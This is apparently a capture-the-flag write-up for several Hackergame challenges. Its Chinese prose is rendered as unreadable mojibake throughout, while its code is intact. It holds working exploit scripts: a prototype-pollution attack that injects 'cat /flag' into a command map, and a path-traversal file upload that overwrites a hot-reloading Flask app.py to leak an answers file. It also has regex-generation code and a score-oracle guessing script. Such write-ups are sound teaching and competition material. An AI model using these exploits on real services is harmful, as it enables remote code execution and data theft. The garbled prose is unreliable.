æ³¨æ„åˆ°è¿™ä¸€è¡Œåªæœ‰ $32$ ä¸ªå­—ç¬¦ï¼Œè€Œæ ¹æ®è¯´æ˜ï¼Œæ¯ä¸€è¡Œåº”è¯¥éƒ½æœ‰ $80$ ä¸ªå­—ç¬¦ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ `B` åé¢è¡¥ä¸Š $48$ ä¸ªåˆé€‚çš„å­—ç¬¦ï¼Œä½¿å¾—æ•´è¡Œé•¿åº¦ä¸º $80$ã€‚æ ¹æ® `creat` è§„åˆ™ï¼Œæ­¤å­—ç¬¦ä¸²æœ‰å¯èƒ½ç”±ä¸€ä¸ª `e`/`E` ç»“å°¾ï¼›æ ¹æ® `referer` è§„åˆ™ï¼Œå‰©ä½™éƒ¨åˆ†åº”è¯¥å‡ä¸º `b`/`B`ã€‚

æ³¨æ„åˆ°ä¸‹ä¸€è¡Œä»£ç ï¼š

```python
assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'B'
```

é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºï¼Œ`poly` åº”ä¸º `BxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxB` çš„å½¢å¼ï¼Œå…¶ä¸­ `x` ä¸º `b`/`B`ã€‚ç„¶åä¸ä¼šäº†ï¼ˆæ‚²

## Node.js is Web Scale

è€ƒè™‘åŸå‹é“¾æ±¡æŸ“ï¼Œä»è€Œå°†ä»»æ„å‘½ä»¤æ³¨å…¥åˆ° `cmds`ã€‚

1. è®¾ç½® `store.__proto__.cmd1` ä¸º `"cat /flag"`
2. æ­¤æ—¶ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šç»§æ‰¿è¿™ä¸ªå±æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ `cmds.cmd1 === "cat /flag"`
3. è°ƒç”¨ `/execute` æ¥å£å³å¯æ‰§è¡Œå‘½ä»¤

```javascript
const params = new URLSearchParams();
function set(key, value) {
    fetch("/set", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ key, value })
    }).then(r => r.text()).then(console.log);
}
function execute(cmd) {
    params.set("cmd", cmd);
    fetch("/execute?" + params.toString()).then(r => r.text()).then(console.log);
}
// Prototype chain pollution
set("__proto__.cmd1", "cat /flag");
// Call the command
execute("cmd1");
```

å¦‚æœä¸æƒ³ç”¨ä»£ç ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ“ä½œï¼š

1. åœ¨ `Set Key-Value Pair` ä¸­è®¾ç½® Key ä¸º `__proto__.cmd1`ï¼ŒValue ä¸º `cat /flag`
2. æ‰“å¼€é“¾æ¥ `https://chal03-y5v7klns.hack-challenge.lug.ustc.edu.cn:8443/execute?cmd=cmd1`

## å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼

### Easy

> ç¼–å†™ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…å¯è¢« $16$ æ•´é™¤çš„åè¿›åˆ¶æ•°ã€‚

æ³¨æ„åˆ° $2000$ å¯è¢« $16$ æ•´é™¤ï¼Œå› æ­¤åˆ¤æ–­ä¸€ä¸ªåè¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²æ˜¯å¦å¯è¢« $16$ æ•´é™¤ï¼Œå¯ä»¥é¦–å…ˆåˆ¤æ–­å€’æ•°ç¬¬ $4$ ä½çš„å¥‡å¶æ€§ï¼Œç„¶ååˆ¤æ–­å $3$ ä½æ˜¯å¦æ»¡è¶³è§„å¾‹ã€‚ä½¿ç”¨å¦‚ä¸‹ Python è„šæœ¬ç”Ÿæˆæ­£åˆ™è¡¨è¾¾å¼ï¼š

```python
prefix = "(0|1|2|3|4|5|6|7|8|9)*" # åŒ¹é…ä»»æ„æ•°
i = 0

# å€’æ•°ç¬¬å››ä½ä¸ºå¶æ•°
part1 = "(0|2|4|6|8)("
while i < 1000:
    part1 += f"{i:03}|"
    i += 16
part1 = part1[:-1] + ")"

# å€’æ•°ç¬¬å››ä½ä¸ºå¥‡æ•°
part2 = "(1|3|5|7|9)("
while i < 2000:
    part2 += f"{i}|"[1:] # å»æ‰ç¬¬ä¸€ä½
    i += 16
part2 = part2[:-1] + ")"

print(f"{prefix}({part1}|{part2})")
```

æœ€ç»ˆæ­£åˆ™è¡¨è¾¾å¼ä¸ºï¼š

```
(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984))
```

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ— æ³•åŒ¹é…å°äº $1000$ çš„æ•°ã€‚ä½†æ˜¯ç”±äºåˆ¤é¢˜è„šæœ¬åœ¨ $[0, 2^{64}]$ èŒƒå›´å†…éšæœºç”Ÿæˆæ•°ï¼Œå¹¶ä¸”åˆ¤æ–­æ¬¡æ•°ä¸º $300$ï¼Œå› æ­¤åªè¦è¿æ°”ä¸ç®—å·®ï¼Œå°±å¯ä»¥é€šè¿‡ã€‚ç»è¿‡ç®€å•çš„ä¼°ç®—ï¼Œå¯ä»¥å¾—å‡ºé€šè¿‡çš„æ¦‚ç‡çº¦ä¸º $\left(\frac{2^{64}-1000}{2^{64}}\right)^{300} \approx 1$ã€‚

### Medium

> ç¼–å†™ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…å¯è¢« $13$ æ•´é™¤çš„äºŒè¿›åˆ¶æ•°

è¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹éš¾åº¦çš„ã€‚ç½‘ä¸Šæœä¸€æœï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ° [è¢« $3$ æ•´é™¤çš„äºŒè¿›åˆ¶æ•°çš„æ­£åˆ™è¡¨è¾¾å¼](https://www.cnblogs.com/holdpassion/archive/2012/09/25/2703120.html)ï¼Œè€Œè¿™åˆ©ç”¨äº†æœ‰é™çŠ¶æ€æœºä¸æ­£åˆ™è¡¨è¾¾å¼çš„äº’ç›¸è½¬æ¢ã€‚

æ„é€ å¦‚ä¸‹çš„æœ‰é™çŠ¶æ€æœºï¼Œå…¶ä¸­å„ä¸ªçŠ¶æ€ $s_k$ çš„ä¸‹æ ‡ $k$ è¡¨ç¤ºå½“å‰çš„ä½™æ•°ï¼Œè€ŒçŠ¶æ€ä¹‹é—´çš„è¾¹ (å­—æ¯è¡¨) $0$, $1$ åˆ†åˆ«è¡¨ç¤ºå½“å‰çŠ¶æ€ä¸‹è¯»å…¥ $0$, $1$ï¼š

<details><summary>æœ‰é™çŠ¶æ€æœº</summary>
```
#states
s00
s01
s02
s03
s04
s05
s06
s07
s08
s09
s10
s11
s12
#initial
s00
#accepting
s00
#alphabet
0
1
#transitions
s00:0>s00
s00:1>s01
s01:0>s02
s01:1>s03
s02:0>s04
s02:1>s05
s03:0>s06
s03:1>s07
s04:0>s08
s04:1>s09
s05:0>s10
s05:1>s11
s06:0>s12
s06:1>s00
s07:0>s01
s07:1>s02
s08:0>s03
s08:1>s04
s09:0>s05
s09:1>s06
s10:0>s07
s10:1>s08
s11:0>s09
s11:1>s10
s12:0>s11
s12:1>s12
```
</details>

å‰å¾€ [FSM2Regex](https://ivanzuzak.info/noam/webapps/fsm2regex/)ï¼Œå°†ä¸Šè¿°æœ‰é™çŠ¶æ€æœºç²˜è´´åˆ°å·¦ä¾§ï¼Œå‘ç°ç½‘é¡µå¡æ­»ã€‚ã€‚çœ‹æ¥è¿˜æ˜¯å¾—ç”¨ Python æ¥è§£å†³ã€‚

```python
from greenery import Fsm, Charclass
from greenery.rxelems import from_fsm

one = Charclass('1')
# zero = Charclass('0')
zero = ~one
transitionMap = {}

for i in range(13):
    transitionMap[f's{i:02d}'] = {
        zero: f's{(i * 2 % 13):02d}',
        one: f's{(i * 2 + 1) % 13:02d}'
    }

fsm = Fsm(
    alphabet={zero, one},
    states={'s00', 's01', 's02', 's03', 's04', 's05', 's06', 's07', 's08', 's09', 's10', 's11', 's12'},
    initial='s00',
    finals={'s00'},
    map=transitionMap
)
# reduced = fsm.reduce()

print(fsm.accepts('101110101010101010000111')) # True
print(fsm.accepts('101110101010101010000110')) # False
print(fsm.accepts('100100111110001110110101110100110110101110011010001100010100010')) # True
print(fsm.accepts('10100010001110001110011110001000000111011010001101110001001110')) # False

def processRegex(regex):
    # Only `0123456789()|*` are allowed
    regex = regex.replace("^1", "0").replace("[0]", "0")
    for i in range(13):
        regex = regex.replace(f'0{{{i}}}', '0' * i)
        regex = regex.replace(f'1{{{i}}}', '1' * i)
    return regex

pattern = from_fsm(fsm)
regex = processRegex(str(pattern))

print(regex)
print("Length:", len(regex))

# After: replace (group)? with ((group)|)
# https://regex101.com/r/D27KJC/1
```

ç”±äºé•¿åº¦è¿‡é•¿ï¼Œæ— æ³•ç›´æ¥é€šè¿‡ `nc` ä¼ è¾“ï¼Œå› æ­¤ä½¿ç”¨ `pwntools`:

```python
from pwn import remote

token = "<token>"
level = "2"
regex = "(1(((1|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))0)(((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|))0)*(1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)((1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))0)|)|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))0)0)*((1|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))0)(((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*(((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|)|((1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0)1((1(01)*0)|)|0(01)*0))|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)1((1(01)*0)|))0)*((1|0(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)0)1((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1|0)|0((((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*01*0((111(01)*1|0)0(((11|0)11(01)*1|10)0)*(11|0)|1)|(1|0(01)*10)(((11|0)11(01)*1|10)0)*(11|0))01)*((1|0(01)*10)(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10)|0(01)*1)1)(01*0(111(01)*1|0)((0(((11|0)11(01)*1|10)0)*((11|0)11(01)*1|10))|)1)*1|0)*"

io = remote("202.38.93.141", 30303)
# print("> ", io.recvline().decode())
io.recvuntil(b"Please input your token:")
io.sendline(token.encode())
# print("> ", io.recvline().decode())
io.recvuntil(b"Enter difficulty level (1~3):")
io.sendline(level.encode())
# print("> ", io.recvline().decode())
io.recvuntil(b"Enter your regex:")
io.sendline(regex.encode())
data = io.recvall().decode().strip()
print(data)
```

## ç¦æ­¢å†…å·

> æ­¤é¢˜è§£ä½¿ç”¨äº† AI è¾…åŠ©åˆ›ä½œï¼ŒèŠå¤©è®°å½•è§ [CTF æ–‡ä»¶è¯»å–æ¼æ´](https://chatgpt.com/share/672db23a-8ea4-800f-9a61-e5c38da2212c)ã€‚

### æ€è·¯ 1 - è¦†ç›–

æ˜¾ç„¶ï¼Œæ­¤ç¨‹åºæœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…è®¸ç”¨æˆ·è¦†ç›–ä»»æ„æ–‡ä»¶ï¼š

```python
@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("ä½ å¿˜äº†ä¸Šä¼ æ–‡ä»¶")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)
```

æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç®€å•çš„ POC æ¥éªŒè¯æ­¤æ¼æ´ï¼š

```python
from requests import Session

URL = "<URL>"
FILE = "data.json" # Any JSON file with 500 [0, 100] integers
x = Session()

r = x.post(URL + "submit", files={
    # "file": (FILE, open(FILE, "rb"))
    "file": ("../web/answers.json", open(FILE, "rb"))
}, allow_redirects=False)

print(r.status_code, r.text)
```

è¿è¡Œæ­¤è„šæœ¬åé‡æ–°è®¿é—®ä¸»é¡µï¼Œå¯ä»¥çœ‹åˆ°åˆ†æ•°ä¸º 0ï¼Œè¯´æ˜å·²ç»æˆåŠŸ **è¦†ç›–** äº†åŸå§‹æ•°æ®ï¼Œä¸»è¦çš„é—®é¢˜æ˜¯å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´æ¥ **è¯»å–** åŸå§‹æ•°æ®ã€‚

è¿™é‡Œå…¶å®æˆ‘æƒ³äº†æŒºä¹…ï¼Œæœ€åè¿˜æ˜¯ ChatGPT çš„å›ç­” (`æ–¹æ³• 1ï¼šè¦†ç›– index.html`) ç»™äº†æˆ‘å¯å‘ã€‚æ³¨æ„åˆ°é¢˜ç›®ç‰¹åˆ«è¯´æ˜äº†ï¼š

> è€Œä¸”æœ‰çš„æ—¶å€™åŠ©æ•™æƒ³æ”¹æ”¹ä»£ç ï¼Œåˆæ‡’å¾—æ‰‹åŠ¨é‡å¯ï¼Œæ‰€ä»¥è¿˜å¼€äº† `--reload`ã€‚

è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›– `app.py`ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ä»£ç ã€‚é‚£ä¹ˆæ„é€ å¦‚ä¸‹ POCï¼š

```python
from requests import Session

URL = "https://chal02-8ab3oyj7.hack-challenge.lug.ustc.edu.cn:8443/"
PAYLOAD = """
from flask import Flask, send_file
import json

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    try:
        return send_file("answers.json")
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    app.run(debug=True)
"""
x = Session()

r = x.post(URL + "submit", files={
    "file": ("../web/app.py", PAYLOAD.encode())
}, allow_redirects=False)

print(r.status_code, r.text)
```

æ‰§è¡Œæ­¤ä»£ç  (è®°å¾—æ‰§è¡Œå‰å…ˆé‡å¯ç¯å¢ƒï¼Œå› ä¸ºåŸæ–‡ä»¶å·²ç»è¢«è¦†ç›–äº†)ï¼Œéšåé‡æ–°è®¿é—®ä¸»é¡µï¼Œå³å¯è·å–åˆ° `answers.json` çš„å†…å®¹ã€‚ä¹‹åï¼Œä½¿ç”¨å¦‚ä¸‹è„šæœ¬è§£ç ï¼Œå³å¯å¾—åˆ° flagï¼š

```python
from json import load
from re import match

def decode(l: list[int]) -> str:
    # å°†å„æ•°å­—åŠ  65 åä½¿ç”¨ ASCII ç¼–ç è½¬æ¢
    return ''.join(chr(i + 65) for i in l)

with open("answers.json", "r") as f:
    answers = load(f)

text = decode(answers)
flag = match(r"flag{.*?}", text) # éè´ªå©ªåŒ¹é…
if flag:
    print(flag.group())
```

### æ€è·¯ 2 - æ¨æµ‹

å®é™…ä¸Šï¼Œä¸åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ¨æµ‹æ¥è·å– flagã€‚é¦–å…ˆä»»æ„ç”Ÿæˆä¸€ä¸ªé•¿åº¦ 500 èŒƒå›´ $[0, 100]$ çš„æ•°ç»„ï¼Œä¸å¦¨è®¾ç½®æˆå…¨éƒ¨ä¸º $50$ï¼Œä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œè·å¾—å¹³æ–¹å·® $x_1$ï¼›éšåï¼Œç¬¬ä¸€ä¸ªå…ƒç´ åŠ ä¸€ï¼Œä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œè·å¾—å¹³æ–¹å·® $x_2$ã€‚è®¾ç¬¬ä¸€ä¸ªå…ƒç´ çœŸå®å€¼ä¸º $a_1$ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰ $(50-a_1)^2=x_1$, $(51-a_1)^2=x_2$ï¼Œè§£æ–¹ç¨‹å³å¯è·å¾— $a_1$ã€‚å¯¹äºåç»­å…ƒç´ äº¦æ˜¯å¦‚æ­¤ã€‚ä»¥ä¸‹æ˜¯ç¤ºä¾‹ Python è„šæœ¬ï¼š

```python
from requests import Session
from json import dumps
from re import search
from time import sleep

URL = "<URL>" # æ›¿æ¢ä¸ºå®é™…æœåŠ¡å™¨çš„ä¸»é¡µ URL
N = 500
DEFAULT_VALUE = 50
x = Session()

def get_diff(user_guess):
    """æäº¤ user_guess æ•°ç»„å¹¶è¿”å›æœåŠ¡å™¨çš„å¹³æ–¹å·®"""
    r = x.post(URL + "submit", files={
        "file": ("data.json", dumps(user_guess).encode())
    })
    # ä»æœåŠ¡å™¨å“åº”ä¸­æå–å¹³æ–¹å·®
    # <li>è¯„æµ‹æˆåŠŸï¼Œä½ çš„å¹³æ–¹å·®ä¸º 742361</li>
    m = search(r"<li>è¯„æµ‹æˆåŠŸï¼Œä½ çš„å¹³æ–¹å·®ä¸º (\d+)</li>", r.text)
    if m:
        return int(m.group(1))
    else:
        raise ValueError("æ— æ³•ä»å“åº”ä¸­æå–å¹³æ–¹å·®")

# åˆå§‹çŒœæµ‹å€¼
user_guess = [DEFAULT_VALUE] * N
answers = []
default_diff = get_diff(user_guess) # è·å–é»˜è®¤å€¼çš„å¹³æ–¹å·®

# éå†æ¯ä¸€ä¸ªå…ƒç´ 
for i in range(N):
    sleep(0.1)

    # ç¬¬ i ä¸ªå…ƒç´  +1
    user_guess[i] += 1
    adjusted_diff = get_diff(user_guess)

    # æ¢å¤çŒœæµ‹æ•°ç»„
    user_guess[i] = DEFAULT_VALUE

    # è®¡ç®—çœŸå®å€¼
    real = int(DEFAULT_VALUE + 0.5 - (adjusted_diff - default_diff) / 2)
    answers.append(real)

    print(f"Element {i+1}/{N} calculated as: {real}")

# éªŒè¯ç­”æ¡ˆ
diff = get_diff(answers)
print("Final diff:", diff)
if diff == 0:
    print("ğŸ‰ Success!")

print("Answers:", answers)
```

åç»­çš„è§£ç è¿‡ç¨‹ä¸æ€è·¯ 1 ç›¸åŒï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€‚

> Edit: ç»æé†’ï¼ŒåŸæ–‡ä»¶å¯èƒ½å«æœ‰è´Ÿæ•°ï¼Œè€Œè¿›è¡Œè¯„åˆ†æ—¶ä¼šå°†è´Ÿæ•°è½¬æ¢ä¸º $0$ï¼Œå› æ­¤æ­¤æ–¹æ³•å¾—åˆ°çš„ç­”æ¡ˆå¹¶ä¸å¯é ã€‚

## é›¶çŸ¥è¯†æ•°ç‹¬

### æ•°ç‹¬é«˜æ‰‹

[Sudoku Solver](https://www.sudoku-solutions.com/). åˆ†åˆ«é€šè¿‡ Easy, Medium, Hard, Expert éš¾åº¦çš„æ•°ç‹¬é¢˜ç›®ï¼Œå¾—åˆ° flagã€‚

## ğŸŒ¸ èŠ±çµ®

### ä½ è¿™è¾ˆå­å°±æ˜¯è¢« Hackergame æ¯äº†

ä½ è¿™è¾ˆå­å°±æ˜¯è¢« Hackergame æ¯äº†ã€‚

ä½ å’Œå¦¹å­ä¸€èµ·å»æ‰“å°èµ„æ–™ï¼Œå¦¹å­è¯´æ‰“å°æœºå¥½ç¥å¥‡ï¼Œä½ å´å¼€å§‹æ“ä½œå›¾ä¹¦é¦†çš„æ™ºèƒ½ç»ˆç«¯ï¼Œç‚¹å¼€æœç´¢ç•Œé¢å¼€å§‹æœã€Œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€ï¼Œå£è‹¥æ‚¬æ²³åœ°è¯´è¿™æœ¬ä¹¦æ˜¯ç§‘å¤§å›¾ä¹¦é¦† $2018$ å¹´çš„æœˆåº¦çƒ­æœç¬¬ä¸€ï¼Œè€Œè¿™ä¸€åˆ‡éƒ½å½’åŠŸäºä½ æœ€çˆ±ç©çš„ç½‘å®‰åŸç¥ã€‚

å¼„å¥½èµ„æ–™åå¦¹å­é‚€è¯·ä½ ä¸€èµ·ç©ï¼Œä½ ä»¬å†³å®šå…ˆå»ä¸­å…³æ‘å…¬å›­é€›ä¸€é€›ã€‚ä½ å’Œå¦¹å­ä¸€èµ·ååœ°é“å»è¥¿äºŒæ——ç«™ï¼Œä¸€ç¾¤äººæŒ¤åœ¨åœ°é“é‡Œï¼Œå¦¹å­å®³ç¾åœ°è´´åœ¨ä½ èº«æ—æ­£è¦å¼€å£è¯´ä»€ä¹ˆï¼Œä½ å´æ‰“æ–­å¥¹è¯´ï¼šä½ çŸ¥é“å—ï¼Œä¸­å…³æ‘å…¬å›­è¾¹ä¸Šçš„ç§¯æ°´æ½­åŒ»é™¢å°±æ˜¯ã€Œæ—…è¡Œç…§ç‰‡ 4.0ã€çš„å–æ™¯åœ°ï¼Œä¸ºäº†æ‰¾åˆ°è¿™ä¸ªåŒ»é™¢æˆ‘å¯æ˜¯å…ˆä»é—¨é”ç”»è´¨çš„å›¾ç‰‡ä¸­å®šä½åˆ°äº† `CRH6F-A`ï¼Œç„¶åæ²¿ç€æ€€æŸ”çº¿æ‰¾äº† $114$ ä¸ªå°æ—¶ã€‚

å¿«åˆ°å…¬å›­æ—¶ï¼Œå¦¹å­è¯´è‡ªå·±åœ¨ ğŸ  æµè§ˆäº†æœ‰è¶£çš„æ•…äº‹æƒ³è·Ÿä½ åˆ†äº«ï¼Œä½ è·Ÿå¦¹å­è¯´ï¼š

1. å°çº¢ä¹¦æœâ€œç§‘é‡Œç§‘æ°”ç§‘åˆ›é©¿ç«™â€ï¼Œæ’é™¤å‡ ä¸ªé”™è¯¯ç­”æ¡ˆ
2. å°çº¢ä¹¦æœâ€œä¸­ç§‘å¤§ ACGéŸ³ä¹èŠ‚â€
3. å°çº¢ä¹¦æœâ€œæ‰“å¡ å…­å®‰ å…¬å›­ å½©è™¹è·¯â€
4. å°çº¢ä¹¦æœâ€œæ‰“å¡ çŸ³å¤´ å–·æ³‰â€ ï¼Œè¿™ä¸ªéœ€è¦æ‰‹åŠ¨å¾€åç¿»ä¸€ç¿»çœ‹çœ‹
5. å°çº¢ä¹¦æœâ€œçº¢è‰² å››èŠ‚ é«˜é“â€ã€‚

åˆ°äº†æ™¯ç‚¹åï¼Œå¦¹å­æ­£åœ¨çœ‹ç€æ™¯ç‚¹çš„ä¸­è‹±æ–‡ä»‹ç»ï¼Œä½ å´è·Ÿå¦¹å­è¯´ï¼Œè¿™ä¸€æ®µæ–‡å­—çš„ä¿¡æ¯ç†µç–‘ä¼¼æœ‰ç‚¹ä½äº†ï¼Œå¯ä»¥ç”¨ *XZRJification Standard*ï¼Œä¸æ–­é™¤æ‰å¤šä½™çš„ e å’Œè¾…éŸ³å­—æ¯ï¼Œä¾‹å¦‚ [`creat`](https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat) å’Œ [`referer`](https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer)ï¼Œæœ€åè¿˜å¯ä»¥é€šè¿‡å“ˆå¸Œä¿è¯ä¿¡æ¯çš„ integrityã€‚

